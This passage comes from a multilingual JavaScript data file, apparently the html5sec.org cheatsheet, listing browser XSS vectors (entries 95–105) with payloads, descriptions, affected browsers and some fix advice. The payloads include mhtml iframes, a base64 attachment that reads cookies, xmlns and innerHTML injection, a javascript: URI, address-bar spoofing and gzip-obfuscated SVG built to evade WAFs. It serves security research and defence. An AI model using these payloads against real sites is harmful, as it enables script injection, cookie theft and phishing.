            'en' : 'SVG allows using filter effects to be applied on arbitrary visible SVG elements. The feImage filter allows inclusion of other files - as well as data URIs. With a maliciuosly crafted data URI it\'s possible to execute JavaScript without user interaction. List all of the elements which can be animated can be found in the specified documentation.',
            'ja' : '',
            'ru' : 'SVG поддерживает фильтры, определяемые в отдельном SVG-элементе - <feImage>. Содержание этого элемента может быть загружено из других файлов, а также из data URI. С помощью специально сформированного data URI возможно выполнить JavaScript без взаимодействия с пользователем. Список всех элементов, которые могут быть анимированы, можно найти по приведенным ссылкам.',
            'cs' : 'SVG umožňuje použití efektu filtrů na libovolný z viditelných prvků. Filtr feImage umožňuje začlenění dalších souborů, stejně tak jako data URI. Se zákeřně vytvořeným data URI je mořné spustit kód JavaScriptu bez spoluúčasti uživatele. Seznam všech prvků, které mohou být animovány, naleznete v dokumentaci.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVG/filters.html', 'http://www.w3.org/TR/SVG11/animate.html#Animatable', 'http://www.w3.org/TR/SVGMobile12/animate.html#Animatable','#88'],
        'howtofix'   : {
            'en' : 'Make sure that user submitted SVG data and SVG files are treated as XML documents - not as images. The nature of SVG allows to include almost arbitrary XML data including JavaScript leading to XSS or worse.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользовательские SVG-данные и SVG-файлы проверяются также, как и обычные XML-документы, а не как изображения. Природа SVG позволяет включать почти произвольные XML-данные, в т.ч. JavaScript, открывающий перспективу XSS и т.д.',
            'cs' : 'Ujistěte se, že uživateli vložená SVG data a SVG soubory jsou skutečně obrázky a ne XML dokumenty. Povaha SVG totiž umožňuje zahrnout do obsahu téměř jakákoliv data ve formátu XML, včetně JavaScriptu, který může vést XSS.',
            'de' : ''
        },
        'browsers'   : {
            'opera'  : ['10.0', '11.0', '12.0', 'mobile']
        },
        'tags'       : ['xss', 'svg', 'opera', 'filter effects', 'feimage'],
        'reporter'   : '.mario'
    },
    { /* ID 96 - JavaScript execution via MHTML-scheme */
        'id'         : 96,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via MHTML-scheme',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с использованием MHTML-схемы.',
            'cs' : 'Spuštění JavaScriptu skrz MHTML schema',
            'de' : ''
        },
        'data'       : '<iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>\n<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>',
        'attachment' : {
            'required_mime' : '',
            'crossdomain'    : '1',            
            'path'          : 'http://html5sec.org/test.html',
            'name'          : 'test.html',
            'raw'           : '<html>\n<body>\n<b>some content without two new line \\n\\n</b>\nContent-Type: multipart/related; boundary="******"<b>some content without two new line</b>\n--******\nContent-Location: xss.html\nContent-Transfer-Encoding: base64\n\nPGlmcmFtZSBuYW1lPWxvIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcmFtZT4NCjxzY3JpcHQ+DQp1\ncmw9bG9jYXRpb24uaHJlZjtkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnbG8nKVswXS5zcmM9\ndXJsLnN1YnN0cmluZyg2LHVybC5pbmRleE9mKCcvJywxNSkpO3NldFRpbWVvdXQoImFsZXJ0KGZy\nYW1lc1snbG8nXS5kb2N1bWVudC5jb29raWUpIiwyMDAwKTsNCjwvc2NyaXB0PiAgICAg\n--******--\n</body>\n</html>'
        },
        'description': {
            'en' : 'This example used the ability to convert the file with any conent type into a web archive using mhtml URI scheme to run JavaScript. For the first time this feature was discovered by Stepanishchev E. in 2006 and became known among web developers as an alternative to data URI for IE6-7. In 2007, Hasegawa Y. independently proposed a way to use this mhtml feature for XSS. Followed fix was incomplete because it doesn\'t take into account the possibility of addressing to the contents of the archive using "!value". This possibility as well as the possibility to access from the archive contents to a host domain are used in the example below.\r\n\r\nUsing this vector all sites that do not contain two new lines in the source code and allows users to insert new line were vulnerable - as well as all sites that allow users to upload images without post-upload conversion etc. A link to this web archives could be specified via <IFRAME> or location.href and comparable.\r\n\r\nThis example was published in June 2010, fix released in April 2011. The mhtml URI scheme doesn\'t determine the content type now, but archive contents still has access to the host domain.',
            'ja' : '',
            'ru' : 'Данный пример для запуска JavaScript использовал возможность превратить файл с любым типом содержимого в веб-архив, используя mhtml-схему доступа. Впервые эта особенность была открыта Степанищевым Е. в 2006 году и получила известность среди вебных разработчиков как альтернатива data URI для IE6-7. В 2007 Хасегава Й. независимо предложил способ использования этого свойства mhtml для целей XSS. Исправление, последовавшее за этим, было неполным, так как не учитывало возможности адресации к содержимому архива с помощью "!value". Эта возможность, а также возможность доступа из содержимого архива к домену, в который он внедрен, использована в нижеприведенном примере.\r\n\r\nТаким образом, были уязвимы все сайты, которые не содержали пустых строк в исходном коде, обычно добавляемых для читабельности, и позволяли пользователю вставлять символы перевода строки, а также все сайты, которые позволяли пользователям загружать неконвертируемые изображения (пример веб-архива, встроенного в изображение, можно взять из папки attachments) и т.п. Ссылка на архив могла быть указана в теге <IFRAME> или с помощью location, или как-либо ещё.\r\n\r\nДанный пример был опубликован в июне 2010 г., исправление выпущено в апреле 2011 г. Теперь тип содержимого не детерминирован mhtml-схемой, содержание архива по-прежнему имеет доступ к хостовому домену.',
            'cs' : '',
            'de' : ''
        },
        'urls'    : ['http://en.wikipedia.org/wiki/MHTML', 'http://bolknote.ru/2006/08/24/~312/', 'http://openmya.hacker.jp/hasegawa/security/ms07-034.txt', 'http://www.microsoft.com/technet/security/advisory/2501696.mspx', 'http://technet.microsoft.com/security/bulletin/ms11-026'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['5.0', '6.0', 'end', '7.0', 'end', '8.0', 'end']
        },
        'tags'       : ['xss', 'internet explorer', 'archive', 'mhtml'],
        'reporter'   : 'Bolk, LeverOne'
    },
    { /* ID 97 - XSS using "xmlns" attribute in custom tag when copying innerHTML (2) */
        'id'         : 97,
        'category'   : 'html', 
        'name'       : {
            'en' : 'XSS using "xmlns" attribute in custom tag when copying innerHTML (2)',
            'ja' : '',
            'ru' : 'XSS с использованием атрибута xmlns в сочетании с пользовательским тегом при копировании с помощью innerHTML (2)',
            'cs' : 'XSS použitím atributu "xmlns" ve vlastním tagu při kopírování innerHTML (2)',
            'de' : ''
        },
        'data'       : '<!-- IE 5-9 -->\r\n<div id=d><x xmlns="><iframe onload=%js_alert%"></div>\n<script>d.innerHTML+=\'\';</script>\r\n\r\n<!-- IE 10 in IE5-9 Standards mode -->\r\n<div id=d><x xmlns=\'"><iframe onload=%js_alert_2%//\'></div>\n<script>d.innerHTML+=\'\';</script>',
        'description': {
	    'en' : 'Internet Explorer incorrectly analyzes the attribute "xmlns" in custom tags when copying innerHTML - its value is being added to the tag <?XML:NAMESPACE> without any delimiters.',
            'ja' : '',
            'ru' : 'Internet Explorer неправильно анализирует атибут xmlns в пользовательских тегах при копировании с помощью innerHTML: параметр этого атрибута добавляется в тег <?XML:NAMESPACE> без оганичителей.',
            'cs' : 'Internet Explorer nesprávně analyzuje atribut "xmlns" ve vlastních tagách během kopírování innerHTML. Jeho hodnota je bez oddělovače přidána k tagu <?XML:NAMESPACE>.',
            'de' : ''
        },
        'urls'    : ['#59', '#98', '#128'],
        'howtofix'   : {
            'en' : 'Be very careful when handling user generated HTMl in the DOM later on. The innerHTML property does not always contain what it\'s supposed to.',
            'ja' : '',
            'ru' : '',
            'cs' : 'Buďte velmi opatrní při pozdější manipulaci v DOM s uživatelskémi vstupy. Vlastnost innerHTML nemusí vždy obsahovat původní data.',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0', '10.0']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 98 - Style injection when copying innerHTML (3) */
        'id'         : 98,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Style injection when copying innerHTML (3)',
            'ja' : '',
            'ru' : 'Стилевая инъекция при копировании с помощью innerHTML (3)',
            'cs' : 'Injekce stylu při kopírování innerHTML (3)',
            'de' : ''
        },
        'data'       : '<div id=d><div style="font-family:\'sans\\27\\2F\\2A\\22\\2A\\2F\\3B color\\3Ared\\3B\'">X</div></div>\n<script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
        'trigger'    : 'document.getElementsByTagName("div")[0].style=="red"?pass():fail()',
        'description': {
	    'en' : 'The example shows that Internet Explorer and Mozilla Firefox automaticaly decode CSS-encoding if the harmless markup is copied using innerHTML.',
            'ja' : '',
            'ru' : 'Пример показывает, как Internet Explorer and Mozilla Firefox автоматически декодируют CSS-кодировку в случае, если на первый взгляд безопасная разметка копируется с помощью innerHTML.',
            'cs' : 'Tento příklad ukazuje, že Internet Explorer a Firefox automaticky dekódují CSS kódování během kopírování innerHTML.',
            'de' : ''
        },
        'urls'    : ['#59', '#97', '#128'],
        'howtofix'   : {
            'en' : 'Be very careful when handling user generated HTMl in the DOM later on. The innerHTML property does not always contain what it\'s supposed to.',
            'ja' : '',
            'ru' : '',
            'cs' : 'Buďte velmi opatrní při pozdější manipulaci v DOM s uživatelskémi vstupy. Vlastnost innerHTML nemusí vždy obsahovat původní data.',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0', '10.0'],
            'firefox': ['2.x', '3.0', '3.6.28', 'end'] 
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml', 'css'],
        'reporter'   : 'sirdarckcat'
    },
    { /* ID 99 - Using comments to obfuscate styles */
        'id'         : 99,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Using comments to obfuscate styles',
            'ja' : '',
            'ru' : 'Использование комментариев для обфускации стилей',
            'cs' : 'použití komentářů z zamlžení stylů',
            'de' : ''
        },
        'data'       : 'XXX<style>\r\n\r\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\r\n\r\n<!--\r\n--><!--*{color:red}   /* all UA */\r\n\r\n*{background:url(xx:x //**/\\red/*)} /* IE 6-7 Standards mode */\r\n\r\n</style>',
        'description': {
	    'en' : 'As noted in CSS2.1 specification (and repeated in CSS3), comments may occur anywhere outside other tokens. The cases that are exceptions to this rule are a subject to special attention. First of all the CSS2.1 specification is inconsistent, since, for example,  the "!important" token in his definition allows comments. Despite the exclusion this feature in CSS3,  IE (8-9 standards mode) and Firefox 13 still support "!/**/important". You can find more obvious mistakes, for example, the same Firefox 13 allows "font-family: Ar/**/ial".\r\nSpecial interest are exceptions to this rule in IE. The first example shows the possibility for comments in the value of the property. The third example, in addition to demonstrating a similar possibility inside the "url()" function, is also an interesting case, when a comment can not be replaced by any other structure (another space or encoded space "\\000020" will not give necessary effect). Typically these cases occur when the token does not match your precise definition. In this example token "url" can not contain a space character.\r\nInside the <STYLE> tag, there are rules for parsing the SGML comment delimiters, that are allowed before and after statements regardless of the form (opening/closing) and nesting.',
            'ja' : '',
            'ru' : 'Как указано в спецификации CSS2.1 (и повторено в CSS3), комментарии могут содержаться в любом месте вне границ других лексем. Случаи, которые являются исключением из этого правила, являются предметом особого внимания. Прежде всего спецификация CSS2.1 является непоследовательной, так как, например, такая лексема, как !important , в своем определении содержит возможность комментариев. Несмотря на исключение этой возможности в CSS3, браузеры IE (в режиме стандартов для IE 8-9) и Firefox 13 до сих пор поддерживают форму !/**/important. Можно найти и другие ошибки подобного рода, так, например, тот же Firefox 13 допускает font-family:Ar/**/ial.\r\nНо особый интерес представляют исключения из этого правила для IE. Первый пример показывает допустимость комментариев в значении свойства. А третий помимо того, что демонстрирует аналогичную возможность внутри функции url() для IE (в режиме стандартов для IE 6-7), ещё является интересным случаем, когда комментарий не может быть заменен никакой другой конструкцией (ни еще один пробел, ни кодированный пробел "\\000020" не будут давать нужный эффект). Как правило, такие случаи появляются тогда, когда лексема не соответствует своему точному определению. Так, данном случае лексема url не может содержать пробельный символ.\r\nВнутри тегов <style> существуют правила парсинга ограничителей SGML-комментариев. Они допускаются до и после грамматической структуры statements вне зависимости от вида (открывающий/закрывающий) и вложенности.',
            'cs' : 'Všechny webové prohlížeče umožňují použít CSS komentáře před a po uvedené vlastnosti nebo hodnotě. Kromě toho umožňuje Internet Explorer i použití komentářů uvnitř samotné hodnoty.V Internet Exploreru a Safari je také možné použitím nekódovaného nulového znaku vložit komentáře uvnitř tagu <STYLE>.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/css3-syntax/#comments', 'http://www.w3.org/TR/CSS2/syndata.html#uri', 'http://www.w3.org/TR/css3-syntax/#grammar0', 'http://www.w3.org/TR/CSS2/grammar.html'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0'],
            'firefox': ['3.x', '4.0', '15.0'],
            'opera'  : ['9.x', '10.0', '11.0', '12.0', 'mobile'],
            'chrome' : ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari' : ['3.0', '4.0', '5.0', '5.1.7'],
        },
        'tags'       : ['trick', 'css', 'obfuscation', 'internet explorer', 'firefox', 'opera', 'chrome', 'safari', 'comment'],
        'reporter'   : 'Roman Ivanov, LeverOne'
    },
    { /* ID 100 - HTML separators and ignored characters */
        'id'         : 100,
        'category'   : 'html', 
        'name'       : {
            'en' : 'HTML separators and ignored characters',
            'ja' : '',
            'ru' : 'Разделители и игнорируемые символы в HTML',
            'cs' : 'Oddělovače v HTML a ignorované znaky',
            'de' : ''
        },
        'data'       : '<img[a][b]src=x[d]onerror[c]=[e]"%js_alert%">',
        'trigger': 'fuzz(document.body, "innerHTML", ["[a]","[b]","[c]","[d]","[e]"]);',
        'description': {
	    'en' : '[a] Characters accepted as tag name/attribute separators.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32,47\nInternet Explorer (5-9 SM): 11\n\n[b] Characters ignored before attributes (and not accepted as parameter/attribute separators).\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 47\nInternet Explorer (5-9 SM): 0**\n\n[c] Characters ignored between attribute name and equals sign.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer (5-9 SM): 0,11\n\n[d] Characters accepted as parameter/attribute separators.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer (5-9 SM): 11\n\n[e] Characters ignored between equals sign and parameter.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer (5-9 SM): 0,11\n\n* Characters are given as decimal ASCII table index.\n** There is a common rule that the unencoded null character does not exist for IE HTML parser.',
            'ja' : '',
            'ru' : '[a] Символы, воспринимаемые в качестве разделителей имени тега и атрибута.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32,47\nInternet Explorer (РС 5-9): 11\n\n[b] Символы, игнорируемые перед атрибутом (и не являющиеся при этом разделителями параметра и атрибута).\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 47\nInternet Explorer (РС 5-9): 0**\n\n[c] Символы, игнорируемые между именем атрибута и знаком равенства.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer (РС 5-9): 0,11\n\n[d] Символы, воспринимаемые в качестве разделителей параметра и атрибута.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer (РС 5-9): 11\n\n[e] Символы, игнорируемые между знаком равенства и параметром.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer (РС 5-9): 0,11\n\n* Приведены в десятичных кодах таблицы ASCII.\n** Существует общее правило, согласно которому для HTML-парсера IE как бы не существует незакодированного нулевого символа.',
            'cs' : '[a] Znaky akceptované jako oddělovače mezi názvem tagu a atributu.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32,47\nInternet Explorer: 11\n\n[b] Znaky ignorované před názvem atributu (ale neakceptované jako oddělovače mezi tagem a atributem).\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 47\nInternet Explorer : 0\n\n[c] Znaky ignorované mezi názvem atributu a rovnítkem.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer : 0,11\n\n[d] Znaky akceptované jako oddělovače atributu a parametru.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer : 11\n\n[e] Znaky ignorované mezi rovnítkem a parametrem.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer : 0,11\n\n* Kódy jsou uvedeny v desítkové soustavě.',
            'de' : ''
        },
        'urls'    : ['http://shazzer.co.uk/vector/Characters-allowed-after-script', 'http://shazzer.co.uk/vector/Attribute-separators', 'http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name', 'http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name', 'http://shazzer.co.uk/vector/Quoteless-attributes-breaker', 'http://docs.google.com/Doc?docid=0ASCeV1AnDNdWZGQ3eDVzbXdfMTZoZGQzNGdneg', '#106'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0', '10.0'],
            'firefox': ['4.0', '15.0'],
            'opera'  : ['9.x', '10.0', '11.0', '12.0', 'mobile'],
            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari' : ['4.0', '5.0', '5.1.7'],
        },
        'tags'       : ['xss', 'internet explorer', 'firefox','opera', 'chrome', 'safari', 'separator'],
        'reporter'   : 'hasegawayosuke, .mario, RSnake, '
    },
    { /* ID 101 -  Characters ignored in the URI scheme */
        'id'         : 101,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Characters ignored in the URI scheme',
            'ja' : '',
            'ru' : 'Символы, игнорируемые в cхеме URI',
            'cs' : 'Znaky ignorované v URI schema',
            'de' : ''
        },
        'data'       : '<a href="[a]java[b]script[c]:%js_alert%">XXX</a>',
        'trigger'    : 'document.links[0].click()',
        'description': {
            'en' : 'The following characters* are ignored in the URI sheme:\r\n[a]\r\nAll mentioned browsers: 9,10,13,32\r\nIE, GC, Safari, Opera: 11,12\r\nIE, GC, Safari, FF 3.6.28↓: 8\r\nIE, GC, Safari: 1-7,14-31\r\nOpera: 160,5760,6158,8192-8202,8232,8233,8239,8287,12288\r\nOpera 11.52↓: 6159\r\nIE (5-9 SM): 0\r\n\r\n[b],[c]\r\nIE, GC, Safari 4.0.3↓, FF 4-6, Opera 10.63↓: 9,10,13\r\nGC 7↓, Safari 4.0.3↓: 1-8,11,12\r\nIE (5-9 SM): 0\r\nSafari 4.0.4↑, Opera 11↑, FF 7↑: nothing\r\n* Characters are given as decimal ASCII table index.',
            'ja' : '',
            'ru' : 'Следующие символы* игнорируются в схеме URI:\r\n[a]\r\nВсе обозначенные браузеры: 9,10,13,32\r\nIE, GC, Safari, Opera: 11,12\r\nIE, GC, Safari, FF 3.6.28↓: 8\r\nIE, GC, Safari: 1-7,14-31\r\nOpera: 160,5760,6158,8192-8202,8232,8233,8239,8287,12288\r\nOpera 11.52↓: 6159\r\nIE (РС 5-9): 0\r\n\r\n[b],[c]\r\nIE, GC, Safari 4.0.3↓, FF 4-6, Opera 10.63↓: 9,10,13\r\nGC 7↓, Safari 4.0.3↓: 1-8,11,12\r\nIE (РС 5-9): 0\r\nSafari 4.0.4↑, Opera 11↑, FF 7↑: ничего\r\n* В десятичных кодах ASCII-таблицы.',
            'cs' : 'Následující znaky* jsou ignorovány v URI schema:\r\n[a]\r\nAll mentioned browsers: 9,10,13,32\r\nIE, GC, Safari, Opera: 11,12\r\nIE, GC, Safari, FF 3.6.28↓: 8\r\nIE, GC, Safari: 1-7,14-31\r\nOpera: 160,5760,6158,8192-8202,8232,8233,8239,8287,12288\r\nOpera 11.52↓: 6159\r\nIE: 0\r\n\r\n[b],[c]\r\nIE, GC, Safari 4.0.3↓, FF 4-6, Opera 10.63↓: 9,10,13\r\nGC 7↓, Safari 4.0.3↓: 1-8,11,12\r\nIE: 0\r\nSafari 4.0.4↑, Opera 11↑, FF 7↑: nic\r\n* ASCII kódy uvedené v desítkové soustavě.',
            'de' : ''
        },
        'urls'    : ['http://shazzer.co.uk/vectors?search=protocol'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0'],
            'firefox': ['4.0', '15.0'],
            'opera'  : ['10.0', '11.0', '12.0', 'mobile'],
            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari' : ['4.0', '5.0', '5.1.7'],
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'chrome', 'safari'],
        'reporter'   : 'Gareth, .mario, RSnake'
    },
    { /* ID 102 - Forced plaintext via unbalanced quotes in Internet Explorer */
        'id'         : 102,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Forced plaintext via unbalanced quotes in Internet Explorer',
            'ja' : '',
            'ru' : 'Провоцирование текста посредством несбалансированной кавычки в Internet Explorer',
            'cs' : 'Vynucení prostého textu nevyváženými uvozovacími znaky v Internet Exploreru',
            'de' : ''
        },
        'data'       : '<img src="x` `<script>%js_alert%</script>"` `>',
        'description': {
            'en' : 'Internet Explorer treats any tag as plaintext in case the attribute delimiters are unbalanced - in this example caused by the ` `. In unbalanced quotes appear inside or outside an attributes - preceded by an arbitrary character but the equals sign - the usage of HTML inside attributes is possible and the content will be rendered as regular HTML. The problem has been reported and will be taken care of in later versions of the Internet Explorer.',
            'ja' : '',
            'ru' : 'Internet Explorer рассматривает любой тег в качестве текстового содержимого в случае, если ограничители атрибута несбалансированы. В данном случае это достигается с помощью двух обратных апострофов вне формального атрибута, один из которых (добавлен с целью соблюдения чётности ограничителей) нейтрализован рядом стоящим символом, а другой выполняет функцию разбалансировки формального тега <IMG>. В результате этого тег <IMG> разбирается браузером как текст, а содержимое атрибута src, наоборот, как HTML.',
            'cs' : 'Internet explorer zachází s tagy, u nichž nejsou vyváženy oddělovače atributů, jako s prostým textem. V tomto případě je nevyvážení způsobeno pomocí ` `. U nevyvážených uvozovacích znaků uvnitř nebo vně atributů, je možné použít uvnitř atributu i HTML. Jeho obsah bude po té vykonán jako pravé HTML. Problém byl nahlášen a v novějších verzích Internet Exploreru by se měla objevit oprava.',
            'de' : ''
        },
        'urls'    : ['#62', '#108', '#133'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer' : ['6.0', '7.0', '8.0', 'end'],
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'parser', 'backtick', 'plaintext'],
        'reporter'   : '.mario, hasegawayosuke'
    },
    { /* ID 103 - Spoofing the address bar information with history.replaceState() */
        'id'         : 103,
        'category'   : 'javascript', 
        'name'       : {
            'en' : 'Spoofing the address bar information with history.replaceState()',
            'ja' : '',
            'ru' : 'Спуфинг информации в адрессной строке с помощью history.replaceState()',
            'cs' : 'Zfalšování informací v address baru pomocí history.replaceState()',
            'de' : ''
        },
        'data'       : '<script>history.pushState(0,0,\'/i/am/somewhere_else\');</script>',
        'description': {
            'en' : 'The history.pushState() and history.replaceState() API allows to create and modify the user\'s history. An attacker can use this feature to change the information displayed in the address bar as well as the location DOM object and thus initiate phishing attacks or obfuscate bad intentions. While pushState adds a new history entry, replaceState modifies the current one. This removes nearly all traces of the actual location from the browsing history giving no possibility to navigate back. The information shown in the address bar cannot be trusted anymore as soon as an attacker or a malicious website execute JavaScript.',
            'ja' : '',
            'ru' : 'Методы history.pushState() и history.replaceState() позволяют создавать и модифицировать историю посещений пользователя. Атакующий может использовать эти возможности для изменения информации, отображаемой в адресной строке, а также DOM-объекта location. Это может быть использовано в частности в фишинг-атаках. Информация, отраженная в адресной строке, больше не сможет рассматриваться в качестве верной, как только атакующий получит возможность исполнить JavaScript.',
            'cs' : 'API funkce history.pushState() a history.replaceState() umožňují vytvořit a změnit uživatelovu historii. Útočník může použít tuto funkci ke změně informací zobrazených v address baru, ale také i umístění DOM objektu. Toho může být zneužito k phishingovému útoku nebo ke zmatení uživatele. Ve chvíli kdy útočník spustí na napadených webových stránkách JavaScript, není již možné informacím v adress baru věřit.',
            'de' : ''
        },
        'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/history.html'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox' : ['4.0', '15.0'],
            'chrome' : ['6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari' : ['5.0', '5.1.7'],
            'opera' : ['11.50', '12.0', 'mobile'] 
        },
        'tags'       : ['xss', 'javascript', 'spoofing', 'history', 'phishing'],
        'reporter'   : '.mario, freddyb'
    },
    { /* ID 104 - Executing JavaScript in SVG Tiny 1.2 without user interaction */
        'id'         : 104,
        'category'   : 'svg', 
        'name'       : {
            'en' : ' Executing JavaScript in SVG Tiny 1.2 without user interaction',
            'ja' : '',
            'ru' : 'Активный скриптинг в SVG Tiny 1.2',
            'cs' : 'Spuštění JavaScriptu v SVG Tiny 1.2 bez uživatelovi interakce',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg" id="foo">\r\n<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E %js_alert% %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>\r\n</svg>',
        'description': {
            'en' : 'Opera - providing advanced support for SVG Tiny 1.2 targeting mobile devices - allows to execute JavaScript without user interaction via arbitrary tags. The tag is being applied with a handler pointing to a data URI containing the actual handler. Important is the hash at the end of the data URI to identify the corrrect handler. It is also possible to refer to an element contained in the SVG by its ID or an external resource.',
            'ja' : '',
            'ru' : 'Пример демонстрирует применение XML-events в SVG: к элементу применяется обработчик, источник которого указан в атрибуте handler. В данный момент данный вектор - только следствие поддержки браузером Opera спецификации XML-events, однако в будущем, вероятно, остальные браузеры реализуют частично данную спецификацию в рамках SVG, как это было сделано с XLink. В атрибуте handler можно сослаться как на внешний источник, так и на элемент, содержащийся в текущем документе по его ID.',
            'cs' : 'Opera poskytuje podporu pro SVG Tiny 1.2 cílenou na mobilní zařízení, která umožňuje pomocí libovolného tagu spustit JavaScript bez uživatelské interakce. Tag je aplikován s ukazatelem události na data URI obsahující její obsluhu. Důležitý je hash na konci data URI sloužící k identifikaci osluhy. Je možné se odkazovat také na prvky v SVG skrz jejich ID nebo externí zdroje.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVGMobile12/script.html', 'http://www.w3.org/TR/2003/REC-xml-events-20031014/', '#85', '#94', '#127'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera' : ['10.x', '11.0', '12.0', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'svg', 'tinysvg', 'listener', 'xml', 'events'],
        'reporter'   : '.mario'
    },
    { /* ID 105 - SVG payload obfuscation with gzipped HTML and MIME type image/svg-xml */
        'id'         : 105,
        'category'   : 'svg', 
        'name'       : {
            'en' : ' SVG payload obfuscation with gzipped HTML and MIME type image/svg-xml',
            'ja' : '',
            'ru' : 'Обфускация полезной SVG-нагрузки с помощью HTML-разметки, сжатой gzip, и MIME-типа image/svg-xml',
            'cs' : 'SVG payload obfuscation s gzipped HTML a MIME typ image/svg-xml',
            'de' : ''
        },
        'data'       : '<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>',
        'description': {
            'en' : 'Opera allows displaying compressed SVG images without the usually necessary encoding header. This works for almost arbitrary data as long as the content type image/svg+xml is set - or image/svg-xml like in this example.\r\n\r\nNotice that the compressed data can be truncated. Opera will still accept it and render the <script> tag and execute the alert(1) - most other Gzip parsers will break though - rendering any WAF or similar tool trying to analyze the payload useless (gzip 1.3.12 states the payload contains 50+ MB of binary gibberish).\r\n\r\nThe example contains no actual SVG code - just a regular <script> tag with a XHTML namespace attribute.',
            'ja' : '',
            'ru' : 'Opera отображает сжатое SVG-изображение без обычно необходимого заголовка encoding. Этот приём работает в отношении практически любых удаленных данных, если установлен тип содержимого image/svg+xml или, как в данном случае, image/svg-xml.\r\n\r\nОбратите внимание, что удаленные данные могут быть искажены. Opera все равно примет их, распознает тег <script> и исполнит его содержимое (хотя большинство других Gzip-парсеров сломается). Попытки любых WAF и тому подобных программ проанализировать полезную нагрузку на данный момент потерпят неудачу (gzip 1.3.12 устанавливает размер возможной полезной нагрузки в 50+ МВ).\r\n\r\nПример не содержит ожидаемого SVG-кода: только обычный тег <script> с пространством имен XHTML.',
